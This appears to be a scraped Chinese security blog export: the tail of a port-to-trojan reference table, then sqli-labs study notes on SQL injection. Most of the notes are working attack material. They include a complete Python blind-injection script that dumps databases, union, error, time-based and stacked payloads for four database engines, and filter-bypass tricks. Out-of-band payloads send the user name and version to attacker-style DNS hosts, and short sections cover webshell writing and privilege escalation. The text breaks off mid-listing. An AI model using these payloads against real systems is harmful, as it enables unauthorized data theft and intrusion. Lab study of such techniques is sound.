10085=SyphillisTCP 10086=SyphillisTCP 10101=BrainSpyTCP 10167=Portal Of DoomTCP 10168=Worm.Supnot.78858.c,Worm.LovGate.TTCP 10520=Acid ShiversTCP 10607=Coma trojanTCP 10666=AmbushTCP 11000=Senna SpyTCP 11050=Host ControlTCP 11051=Host ControlTCP 11223=Progenic,Hack ’99KeyLoggerTCP 11831=TROJ_LATINUS.SVRTCP 12076=Gjamer,MSH.104bTCP 12223=Hack’99 KeyLoggerTCP 12345=GabanBus,NetBus 1.6/1.7,Pie Bill Gates,X-billTCP 12346=GabanBus,NetBus 1.6/1.7,X-billTCP 12349=BioNetTCP 12361=Whack-a-moleTCP 12362=Whack-a-moleTCP 12363=Whack-a-moleTCP12378=W32/Gibe@MMTCP 12456=NetBusTCP 12623=DUN ControlTCP 12624=ButtmanTCP 12631=WhackJob,WhackJob.NB1.7TCP 12701=Eclipse2000TCP 12754=MstreamTCP 13000=Senna SpyTCP 13010=Hacker BrazilTCP 13013=PsychwardTCP 13223=Tribal Voice的聊天程序PowWowTCP 13700=Kuang2 The VirusTCP 14456=SoleroTCP 14500=PC InvaderTCP 14501=PC InvaderTCP 14502=PC InvaderTCP 14503=PC InvaderTCP 15000=NetDaemon 1.0TCP 15092=Host ControlTCP 15104=MstreamTCP 16484=MosuckerTCP 16660=Stacheldraht (DDoS)TCP 16772=ICQ RevengeTCP 16959=PriorityTCP 16969=PriorityTCP 17027=提供广告服务的Conducent”adbot”共享软件TCP 17166=MosaicTCP 17300=Kuang2 The VirusTCP 17490=CrazyNetTCP 17500=CrazyNetTCP 17569=Infector 1.4.x + 1.6.xTCP 17777=NephronTCP 18753=Shaft (DDoS)TCP 19191=蓝色火焰TCP 19864=ICQ RevengeTCP 20000=Millennium II (GrilFriend)TCP 20001=Millennium II (GrilFriend)TCP 20002=AcidkoRTCP 20034=NetBus 2 ProTCP 20168=LovgateTCP 20203=Logged,ChupacabraTCP 20331=BlaTCP 20432=Shaft (DDoS)TCP 20808=Worm.LovGate.v.QQTCP 213 35=Tribal Flood Network,TrinooTCP 21544=Schwindler 1.82,GirlFriendTCP 21554=Schwindler 1.82,GirlFriend,Exloiter 1.0.1.2TCP 22222=Prosiak,RuXUploader2.0TCP 22784=Backdoor.IntruzzoTCP 23432=Asylum 0.1.3TCP 23444=网络公牛TCP 23456=Evil FTP,Ugly FTP,WhackJobTCP 23476=Donald DickTCP 23477=Donald DickTCP 23777=INet SpyTCP 26274=DeltaTCP 26681=Spy VoiceTCP 27374=Sub Seven 2.0+,Backdoor.BasteTCP 27444=Tribal Flood Network,TrinooTCP 27665=Tribal Flood Network,TrinooTCP 29431=Hack AttackTCP 29432=Hack AttackTCP 29104=Host ControlTCP 29559=TROJ_LATINUS.SVRTCP 29891=The UnexplainedTCP 30001=Terr0r32TCP 30003=Death,Lamers DeathTCP 30029=AOL trojanTCP 30100=NetSphere 1.27a,NetSphere 1.31TCP 30101=NetSphere 1.31,NetSphere 1.27aTCP 30102=NetSphere 1.27a,NetSphere 1.31TCP 30103=NetSphere 1.31TCP 30303=Sockets de TroieTCP 30722=W32.Esbot.ATCP 30947=IntruseTCP 30999=Kuang2TCP 31336=Bo WhackTCP 31337=Baron Night,BO client,BO2,Bo Facil,BackFire,Back Orifice,DeepBO,Freak2k,NetSpyTCP 31338=NetSpy,Back Orifice,DeepBOTCP 31339=NetSpy DKTCP 31554=SchwindlerTCP 31666=BOWhackTCP 31778=Hack AttackTCP 31785=Hack AttackTCP 31787=Hack AttackTCP 31789=Hack AttackTCP 31791=Hack AttackTCP 31792=Hack AttackTCP 32100=PeanutBrittleTCP 32418=Acid BatteryTCP 33333=Prosiak,Blakharaz 1.0TCP 33577=Son Of PsychwardTCP 33777=Son Of PsychwardTCP 33911=Spirit 2001aTCP 34324=BigGluck,TN,Tiny Telnet ServerTCP 34555=Trin00 (Windows) (DDoS)TCP 35555=Trin00 (Windows) (DDoS)TCP 36794=Worm.Bugbear-ATCP 37651=YATTCP 40412=The SpyTCP 40421=Agent 40421,Masters Paradise.96TCP 40422=Masters ParadiseTCP 40423=Masters Paradise.97TCP 40425=Masters ParadiseTCP 40426=Masters Paradise 3.xTCP 41666=Remote BootTCP 43210=Schoolbus 1.6/2.0TCP 44444=Delta SourceTCP 44445=HappypigTCP 45576=未知代理TCP 47252=ProsiakTCP 47262=DeltaTCP 47878=BirdSpy2TCP 49301=Online KeyloggerTCP 50505=Sockets de TroieTCP 50766=Fore,SchwindlerTCP 51966=CafeIniTCP 53001=Remote Windows ShutdownTCP 53217=Acid Battery 2000TCP 54283=Back Door-G,Sub7TCP 54320=Back Orifice 2000,SheepTCP 54321=School Bus .69-1.11,Sheep,BO2KTCP 57341=NetRaiderTCP 58008=BackDoor.TronTCP 58009=BackDoor.TronTCP 58339=ButtFunnelTCP 59211=BackDoor.DuckToyTCP 60000=Deep ThroatTCP 60068=Xzip 6000068TCP 60411=ConnectionTCP 60606=TROJ_BCKDOR.G2.ATCP 61466=TelecommandoTCP 61603=Bunker-killTCP 63485=Bunker-killTCP 65000=Devil,DDoSTCP 65432=Th3tr41t0r,The TraitorTCP 65530=TROJ_WINMITE.10TCP 65535=RC,Adore Worm/LinuxUDP端口（静态端口）UDP 1=Sockets des TroieUDP 9=ChargenUDP 19=ChargenUDP 69=PasanaUDP 80=PenroxUDP 371=ClearCase版本管理软件UDP 445=公共Internet文件系统（CIFS)UDP 500=Internet密钥交换（IP安全性 ,IKE)UDP端口（动态端口）UDP 1025=Maverick’s Matrix 1.2 - 2.0UDP 1026=Remote Explorer 2000UDP 1027=UC聊天软件，Trojan.Huigezi.eUDP 1028=3721上网助手（用途不明，建议用户警惕！），KiLo,SubSARIUDP 1029=SubSARIUDP 1031=XotUDP 1032=Akosch4UDP 1104=RexxRaveUDP 1111=DaodanUDP 1116=LurkerUDP 1122=Last 2000,SingularityUDP 1183=Cyn,SweetHeartUDP 1200=NoBackOUDP 1201=NoBackOUDP 1342=BLA trojanUDP 1344=PtakksUDP 1349=BO dllUDP 1561=MuSka52UDP 1701=VPN网关（L2TP）UDP 1772=NetControleUDP 1978=SlapperUDP 1985=Black DiverUDP 2000=A-trojan,Fear,Force,GOTHIC Intruder,Last 2000,Real 2000UDP 2001=ScalperUDP 2002=SlapperUDP 2015=raid-csUDP 2018=rellpackUDP 2130=Mini BackLashUDP 2140=Deep Throat,Foreplay,The InvasorUDP 2222=SweetHeart,WayUDP 2339=Voice SpyUDP 2702=Black DiverUDP 2989=RATUDP 3150=Deep ThroatUDP 3215=XHXUDP 3333=DaodanUDP 3801=EclypseUDP 3996=Remote AnythingUDP 4128=RedShadUDP 4156=SlapperUDP 4500=sae-urn/ (IP安全性，IKE NAT遍历）UDP 5419=DarkSkyUDP 5503=Remote Shell TrojanUDP 5555=DaodanUDP 5882=Y3K RATUDP 5888=Y3K RATUDP 6112=Battle .net GameUDP 6666=KiLoUDP 6667=KiLoUDP 6766=KiLoUDP 6767=KiLo,UandMeUDP 6838=Mstream Agent-handlerUDP 7028=未知木马UDP 7424=Host ControlUDP 7788=SingularityUDP 7983=MStream handler-agentUDP 8012=PtakksUDP 8090=Aphex’s Remote Packet SnifferUDP 8127=9_119,ChonkerUDP 8488=KiLoUDP 8489=KiLoUDP 8787=BackOrifice 2000UDP 8879=BackOrifice 2000UDP 9325=MStream Agent-handlerUDP 10000=XHXUDP 10067=Portal of DoomUDP 10084=SyphillisUDP 10100=SlapperUDP 10167=Portal of DoomUDP 10498=MstreamUDP 10666=AmbushUDP 11225=CynUDP 12321=ProtossUDP 12345=BlueIce 2000UDP12378=W32/Gibe@MMUDP 12623=ButtMan,DUN ControlUDP 15210=UDP remote shell backdoor serverUDP 15486=KiLoUDP 16514=KiLoUDP 16515=KiLoUDP 18753=Shaft handler to AgentUDP 20433=ShaftUDP 21554=GirlFriendUDP 22784=Backdoor.IntruzzoUDP 23476=Donald DickUDP 25123=MOTDUDP 26274=Delta SourceUDP 26374=Sub-7 2.1UDP 26444=Trin00/TFN2KUDP 26573=Sub-7 2.1UDP 27184=Alvgus trojan 2000UDP 27444=TrinooUDP 29589=KiLoUDP 29891=The UnexplainedUDP 30103=NetSphereUDP 31320=Little WitchUDP 31335=Trin00 DoS AttackUDP 31337=Baron Night,BO client,BO2,Bo Facil,BackFire,Back Orifice,DeepBOUDP 31338=Back Orifice,NetSpy DK,DeepBOUDP 31339=Little WitchUDP 31340=Little WitchUDP 31416=LithiumUDP 31787=Hack aTackUDP 31789=Hack aTackUDP 31790=Hack aTackUDP 31791=Hack aTackUDP 33390=未知木马UDP 34555=TrinooUDP 35555=TrinooUDP 43720=KiLoUDP 44014=IaniUDP 44767=School BusUDP 46666=TaskmanUDP 47262=Delta SourceUDP 47785=KiLoUDP 49301=OnLine keyLoggerUDP 49683=FensterUDP 49698=KiLoUDP 52901=OmegaUDP 54320=Back OrificeUDP 54321=Back Orifice 2000UDP 54341=NetRaider TrojanUDP 61746=KiLOUDP 61747=KiLOUDP 61748=KiLOUDP 65432=The Traitor","link":"/2019/10/10/port-service/"},{"title":"SQL注入","text":"sqli-labs记录，后面的数字是关数。 随时添加新的trick SQL注入的关键在于闭合 以 Mysql 为例，其他的在后面添加 SQLi-labs 题解Updatexml, extractvalue -512345id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)id=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)id=updatexml(1,concat(0x7e,SUBSTR((SELECT @@version),1,24),0x7e),1)updatexml(1,concat(0x7e,(select substring(f14g,20) from f14g limit 0,1),0x7e),1)extractvalue(0x0a,concat(0x0a,(select database()))) updatexml最多只能显示32位 布尔盲注 -8针对没有回显，只显示查询是否成功的注入，通过逐位判断注出数据。 1234?id=1 # 正常，显示You are in?id=1' # 发生了错误，没有回显?id=1' and 1=1--+ # 正常?id=1' and 1=2--+ # 无结果，同样没有回显 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122import requestsurl = 'http://1dd20f94-5f32-41ba-a9b3-4b023c50b547.node3.buuoj.cn/Less-8'flag = 'You are in...........'param_name = 'id'brutelist = ',abcdefghijklnmopqrstuvwxyz_1234567890'def send_requests(payload): # ok payload_dict = {param_name: payload} r = requests.get(url, params=payload_dict) # print(r.url) return r.textdef get_db_length(): # ok count = 1 while True: payload = &quot;1\\' AND LENGTH(DATABASE())=&quot; + str(count) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: return count count += 1def get_db_name(db_length): # ok db_name = '' for i in range(1, db_length+1): for j in brutelist: j = ord(j) payload = &quot;1\\' AND ASCII(SUBSTR(DATABASE(),&quot; + str(i) + &quot;,1))=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: db_name += chr(j) break return db_namedef get_table_length(db_name): # ok count = 1 while True: payload = &quot;1\\' AND (SELECT LENGTH(GROUP_CONCAT(table_name)) FROM information_schema.tables WHERE table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(count) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: return count count += 1def get_table_name(db_name, table_length): # ok table_name = '' for i in range(1, table_length+1): for j in brutelist: j = ord(j) payload = &quot;1\\' AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(table_name),&quot; + str(i) + &quot;,1)) FROM information_schema.tables WHERE table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: table_name += chr(j) break return table_namedef get_column_length(db_name, table_name): # ok count = 1 while True: payload = &quot;1\\' AND (SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name=\\'&quot; + table_name + &quot;\\' AND table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(count) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: return count count += 1def get_column_name(db_name, table_name, column_length): # ok column_name = '' for i in range(1, column_length+1): for j in brutelist: j = ord(j) payload = &quot;1\\' AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(column_name),&quot; + str(i) + &quot;,1)) FROM information_schema.columns WHERE table_name=\\'&quot; + table_name + &quot;\\' AND table_schema=\\'&quot; + db_name + &quot;\\')=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: column_name += chr(j) break return column_namedef get_data(table_name, column_name): res = {} for column in column_name.split(','): res[column] = '' i = 1 while True: f = 0 for j in range(32, 127): payload = &quot;1\\' AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(&quot; + column + &quot;),&quot; + str(i) + &quot;,1)) FROM &quot; + table_name + &quot;)=&quot; + str(j) + &quot;-- &quot; recv = send_requests(payload) if flag in recv: f = 1 res[column] += chr(j) break i += 1 if f == 0: break return resdef main(): print('Working on ' + url) db_length = get_db_length() db_name = get_db_name(db_length) print('Database: ' + db_name) table_length = get_table_length(db_name) table_name = get_table_name(db_name, table_length) print('Tables: ' + table_name) table_name = input('Select a table to dump: ') column_length = get_column_length(db_name, table_name) column_name = get_column_name(db_name, table_name, column_length) data = get_data(table_name, column_name) print(data)if __name__ == '__main__': main() 这里注入data的时候也应该先爆出长度再注数据，否则一旦丢包会导致后面的数据全部丢失。此外可以使用二分法查找数据，效率更高。 时间盲注 -9利用IF(statement,1,sleep(5))的形式，如果结果为真，会直接返回结果，否则会5秒之后返回一个页面，其他与上面类似。 1?id=1' and sleep(5)--+ # 5秒后返回了页面，存在时间盲注 python中可以用time模块中的time.time()获取当前时间。 拆分 -23过滤了注释符，分别闭合前面和后面的单引号 10' union select 1,database(),'3 二次注入 -24注册新用户和登录时无法产生注入，但是修改密码时没有进行过滤。 注册用户admin'#，经过了转义，它只是一个普通的用户名，不会产生注入，登录时同理。但在修改密码时没有进行过滤，语句变为update set users password='$pass' where username='admin'# ....，修改了admin的密码。 过滤 -25 -26 -27双写绕过，anandd过滤后变成and。 SQL对大小写不敏感，SeleCt 空格可以用/**/、()、%0a、反引号、tab、%a0、%0b 可以用报错注入，用括号绕过空格 1?id=1%27||updatexml(1,concat(%27$%27,(select(database())),1),1)||%271%27=%271 注入手法联合注入以 select id,user,pass from users where id='$id' 为例 判断闭合 12id=1' 报错id=1'# 正常，单引号闭合 判断列数 121' order by 3# 正常1' order by 4# 报错，3列 判断显示位，假设显示位是 user，同时也可以判断列数 10' union select 1,2,3# 显示2，显示位是第二位 查当前数据库 10' union select 1,database(),3# 查数据库 10' union select 1,group_concat(schema_name),3 from information_schema.schemata# 查表名 10' union select 1,group_concat(table_name),3 from information_schema.tables where schema_name='dvwa'# 查列名 10' union select 1,group_concat(column_name),3 from information_schema.columns where schema_name='dvwa' and table_name='users'# 查数据 10' union select 1,group_concat(password),3 from dvwa.users# 宽字节注入传入的单引号被反斜杠转义，而数据库编码为GBK时，可以通过输入一个ascii码范围外的字符与添加的反斜杠结合成一个GBK字符，比如正常情况下 1id=1' 被加入反斜杠转义，查询语句变成 1select * from users where 'id=1/'' 不会引发注入，而加入一个其他字符后 1id=%df' %df和反斜杠结合成了一个新的GBK字符，单引号没有被转义，查询语句 1select * from users where id='？'' 报错注入SQL 中的报错有时会提示一些信息，报错注入指将查询结果包含在报错信息中 12345678910union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a # 主键重复，利用floor()和rand()id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) # extractvalue()id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) # updatexml()id=1 and geometrycollection((select * from(select * from(select user())a)b)) #geometrycollection()id=1 and multipoint((select * from(select * from(select user())a)b)) # multipoint()id=1 and polygon((select * from(select * from(select user())a)b)) # polygon()id=1 and multipolygon((select * from(select * from(select user())a)b)) #multipolygon()id=1 and linestring((select * from(select * from(select user())a)b)) # linestring()id=1 and multilinestring((select * from(select * from(select user())a)b)) # multilinestring()id=1 and exp(~(select * from(select user())a)) # exp() 布尔盲注在服务端只返回查询成功和失败的情况下，通过逐位爆破得到结果。 以select id,user,pass from users where id=$id为例，假设查询成功返回yes，失败返回no 12341 返回yes0 返回noif(1=1,1,0) 返回yesif(1=2,1,0) 返回no 查当前数据库 1234if(select ascii(substr(database(),1,1))=65,1,0) 返回yes则第一位是aif(select ascii(substr(database(),1,1))=66,1,0) 返回yes则第一位是b...if(select ascii(substr(database(),2,1))=65,1,0) 查询第二位 其他类似 可以在外侧使用 ifnull，strcmp 函数 时间盲注与布尔盲注同理，判断查询是否成功的方式从返回的结果变为返回的时间 1if(select ascii(substr(database(),1,1))=65,1,0) and sleep(5) 过5秒返回结果说明前面的语句为真 除了 sleep ，可以使用 rlike, rpad, repeat, bunch 等大量计算达到延时效果 堆叠注入有时sql可以执行以分号分割的多条查询语句，此时可能存在堆叠注入 1id=1';select if(ascii(substr(user(),1,1))=65,sleep(3),1)%23 PDOPDO(PHP Data Object)，为访问数据库提供了统一的接口。 PDO 默认支持多语句执行，使用时会向 Mysql 服务器发送一次 Set Option 请求将 multi statements 设置打开。 Mysql 支持预处理，利用参数化高效执行重复的语句，官方将 prepare，execute，deallocate 统称为 prepare statement，最常用的是 prepare 和 execute。 在 PDO 下的注入，只要没有设置 array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false)，就有可能存在多语句执行，而使用?可以防止字符串拼接。 12345678910111213141516171819202122&lt;?php header('content-type: text/html; charset=utf-8'); $dbms='mysql'; $host='127.0.0.1'; $dbName='test'; $user='root'; $pass='root';$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;; try { $pdo = new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false)); } catch (PDOException $e) { echo $e; } $id = $_GET['id'];$sql = &quot;SELECT * from test where id =?&quot;; $stmt = $pdo-&gt;prepare($sql);$stmt-&gt;bindParam(1,$id); $stmt-&gt;execute(); while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)) { echo &quot;用户ID：&quot;.$row['id'].&quot;&lt;br &gt;&quot;; echo &quot;用户名：&quot;.$row['name'].&quot;&lt;br &gt;&quot;; var_dump($row); } PDO 不能防止所有注入，在 orderby 和 limit 关键字后的参数不能参数化。 带外注入当不能通过回显或者盲注观察sql的执行结果时，可以考虑使用带外注入，原理是利用dns解析，逐位爆破 配置域名解析，先添加一条名为oob、值为ns1.attack.com的 NS 记录，创建一个子域，再添加名为ns1，值为服务器IP的 A 记录，这会将子域oob.attack.com所有的 DNS 请求转发到服务器中。在服务器中使用 tcpdump -n port 53 观察DNS请求，在另一台机器上使用 dig test.oob.attack.com，此时应该可以在服务器中看到对 test.oob.attack.com的查询。 配置完成，接下来是在SQL中实现DNS查询，并把查询的结果包含进去。 Oracle 1234567891011121314/*检测*/SELECT DBMS_LDAP.INIT((‘oob.dnsattacker.com',80) FROM DUAL; /* Extracting Oracle database version */SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.attacker.com',80) FROM dual; /*Extracting Current user in Oracle database */SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual; /*10G 或更低版本可用以下替代方法*/UTL_INADDR.GET_HOST_ADDRESS, UTL_HTTP.REQUEST,HTTP_URITYPE.GETCLOB, DBMS_LDAP.INIT and UTL_TCP MSSQL 12345678910111213/*检测*/EXEC master..xp_dirtree '\\\\oob.dnsattacker.com \\' –/*Payload，需要 sysadmin 权限*/DECLARE @data varchar(1024);SELECT @data = (SELECT system_user); EXEC('master..xp_dirtree &quot;\\\\'+@data+'.oob.dnsattacker.com\\foo$&quot;');/*其他方法*/xp_fileexists,xp_subdirs,xp_getfiledetails,sp_add_sobstep MySQL 12345/*检测*/SELECT LOAD_FILE(CONCAT('\\\\\\\\', 'oob.dnsattacker.com\\\\test.txt'));/*payload，需要 file,select,update 权限*/SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT HEX(CONCAT(user(),&quot;\\n&quot;))), '.oob.dnsattacker.com\\\\test.txt')); Postgresql 1234567891011121314151617/*检测*/CREATE EXTENSION dblink;SELECT dblink_connect('host=oob.dnsattacker.com user=postgres password=password dbname=dvdrental');/*payload，需要 superuser 权限执行 CREATE EXTENSION 查询*/DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (SELECT encode(convert_to(concat(user,' '), 'UTF8'),'hex')); exec_cmd := E'COPY table_output(content) FROM E\\'\\\\\\\\\\\\\\\\'||query_result||E'.oob.dnsattacker.com\\\\\\\\foobar.txt\\''; EXECUTE exec_cmd;END;$$ LANGUAGE plpgsql SECURITY DEFINER;SELECT temp_function(); DNS数据提取的限制： 域名最多包含127个子域 每个子域最多包含63字符 完整域名最大长度为253字符 由于DNS记录缓存，会为每个请求的URL添加一个唯一值 DNS是明文通道，可悲中间节点和DNS服务器缓存使用，敏感数据可能泄露 二阶注入查询时没有发生注入，但是查询的结果或者语句用在了其他地方，产生了注入。可参考sqli-labs less-25 注入点搜索框 日期类型参数，如果没有进行强制类型转换容易出现注入 order by: 123order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))order by if(1=2,1,(select(1)from(select(sleep(2)))test))order by (select 1 regexp if(substring(user(),1,1)=0x72,1,0x00)) limit: 1limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1) group by: 1group by if(1=2,1,(select(1)from(select(sleep(2)))test)) table: 1users where updatexml(1,concat(0x7e,(select user()),0x7e),1)# Bypass字符串操作1234567891011121314151617181920212223242526272829303132333435363738394041424344// 合并concat(str1,str2,...)concat_ws(separator, str1, str2)// 截取substring(str,pos,n)substr(str,pos,n)mid(str,pos,n)left(str,len)right(str,len)substring_index(str,delim,count)// 计算字符串长度char_length()character_length()length()octet_length()// 替换replace()// 查找子串locate()instr()position()find_in_set()// 正则匹配like 常用通配符 %(匹配0个或任意多个字符)，_(匹配一个字符)，escape(转义%和_)regexp/rlike 正则表达式匹配// 二进制比较(可区分大小写)select &quot;A&quot; = BINARY &quot;a&quot; // 结果为 0// 自定义排序，盲注开关elt(N, str1, str2,...) // 若 N=1，则返回 str1，N=2 则返回 str2,未找到返回 NULLselect elt(1,1) // 结果为1select elt(1,0) // 结果为0field(1,0) //结果为0field(1,1) /结果为1// 不使用逗号substr(database(),1,1) limit n,msubstr(database from 1 for 1) limit m offset n union select 1,2,3union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c)elect ascii(mid(user(),1,1))=80 select user() like 'r%' 变量变量分为 普通变量以@开头，连接关闭时释放，系统变量以@@开头，表示 Mysql 服务器的属性，许多系统变量有两种形式，@@session.wait.wait_timeout 表示当前连接，@@global.wait_timeout 表示服务器。 set 使用 = 赋值，select 使用 := 或 into 赋值。 123456set @varname=3;select @varname; // 3select @varname:=4select @varname; // 4select count(*) from users into @varname;select @varname; // 5 可以用表达式给变量赋值，赋值运算符优先级最低。 条件表达式123if(condition, result1, result2);case expr when val1 then result1 when val2 then result2 else result3;case when condition1 then result1 when condition2 then result2 else result3; 子查询注释123单行 # 和 -- (有空格)多行 /* */内联 /*! */ 默认执行其中的内容，如包含版本号，高于该版本号才会执行 其他可用 0x1234或x'1234'表示十六进制； 支持字符串和数指之间转换，'12.34a'+1为13.34 支持二进制数值，b'1011' 首先确定被拦截的部分，针对性绕过。 大小写 SelECt 双写 seleselectct 编码，url 或者 hex 空格，用括号，注释/**/，%a0绕过 逗号绕过，在 substr()和mid()中使用from to 比较符号绕过，greattest between and regexp 正则 和 like 注入 逻辑，and和&amp;&amp;，or和||，xor和|，not和!可以替换 函数，hex()、bin()和ascii()，concat_ws()和group_concat()，mid()、substr()和substring() HTTP参数污染，id=1 union select 1,2,3 from users where id=1-变成id=1 union select 1&amp;id=2,3 from users where id=1- 缓冲区溢出，id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+version(),database(),user()–+ 注释符 #comment /*comment*/ -- comment 内联注释 /*!comment*/，id=1/*!UniOn*/Select 1# select，使用handler语句代替（Mysql）： 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 字符串可使用 16 进制编码，不使用引号 group_concat 可以用 concat_ws 替换 其他SMB Relay 攻击异或注入当SQL接受异或操作符时，可以通过异或完成盲注。 1id=1^(exp)^1%23 当 exp 为 true 时，返回 id=1 的结果，false 返回 id=0 的结果。 无列名注入例如SWPU2019]Web1，无法得到列名。 可以利用union select构造新的列名（需要知道列数），以sqli-labs的security库为例 1select 1,2,3 union select * from users; 返回结果是一张新的表，列名分别是1，2，3，然后再从这张新表中查询数据 123select `3` from (select 1,2,3 union select * from users)as a;select `3` from (select 1,2,3 union select * from users)a;# 这两种等价 就在不知道列名的情况下得到了第三列的数据，as a是为这张新表指定一个别名，否则会出错。反引号表示查询的这个列名为3，而不是select 数字3。 也可以为列设置别名 1select 1 a,2 b,3 c union select * from users; 这样就可以 1select c from (select 1,2,3 c union select * from users)a; 无法使用information_schema12345sys.schema_auto_increment_columns，需要在表中有一个自增的字段，一般是id。sys.schema_table_statistics_with_buffersys.x$ps_schema_table_statistics_iomysql.innodb_index_statsmysql.innodb_table_stats 后续操作写入 webshell写入webshell是有条件的，包括： secure_file_priv配置项 NULL，禁止导入或导出文件 /tmp/，只能在 tmp 目录下导入导出文件 ，（空串），无限制 运行数据库的用户有写权限 知道 web 目录位置 任意文件上传没有路径时，数据库中会存储路径，配合 sqlmap 的 --sql-shell 和 --search 寻找 shell 位置。 提权UDF 提权12345671、其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数,有root账号密码。2、Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\\plugin文件夹下。3、Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\\windows\\system32，在windows2000下放置于c:\\winnt\\system32。4、掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。 MOF 提权123利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\\System32\\Wbem\\MOF目录下。 Oracle联合注入123456?id=-1' union select user,null from dual--?id=-1' union select version,null from v$instance--?id=-1' union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--?id=-1' union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=2)--?id=-1' union select username,passwd from users--?id=-1' union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)-- 报错注入12345?id=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))--?id=1' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like 'Oracle%))--?id=1' and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--?id=1' and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=3))--?id=1' and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1)) 布尔盲注除了 ifelse，还可以使用 encode 12345678910111213141516decode（条件，值1，返回值1，值2，返回值2，...值n，返回值n，更改值）相当于：IF 条件=值1 THEN RETURN(返回值1)ELSIF 条件=值2 THEN RETURN(返回值2) ......ELSIF 条件=值n THEN RETURN(返回值n)ELSE RETURN(缺省值)END IF?id=1' and 1=(select decode(user,'SYSTEM',1,0,0) from dual)--?id=1' and 1=(select decode(substr(user,1,1),'S',1,0,0) from dual)-- 时间盲注12?id=1' and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)--?id=1' and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)-- SQL Server联合注入12345678?id=-1' union select null,null--?id=-1' union select @@servername, @@version--?id=-1' union select db_name(),suser_sname()--?id=-1' union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--?id=-1' union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--?id--1' union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--?id=-1' union select (select top 1 column name from information_schema.columns where table_name='users' and column_name not in (select top 1 column_name from information_schema.columns where table_name = 'users')),null---?id=-1' union select (select top 1 username from users where username not in (select top 3 username from users)),null-- 报错注入12?id=1' and 1=(select 1/@@servername)--?id=1' and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))-- 布尔盲注1?id=1' and ascii(substring((select db_ name(1)),1,1))&gt; 64-- 时间盲注12?id= 1';if(2&gt;1) waitfor delay '0:0:5'--?id= 1';if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) wait MSSQL，由浅入深了解MSSQL注入.pdf PostgresqlPostgresql， copy from， copy to 读文件。 Sqlmap中文手册 读源码版本：sqlmap-1.5.3-27-gdd32bfb 目录结构1234567891011121314.├── COMMITMENT├── LICENSE├── README.md├── data├── 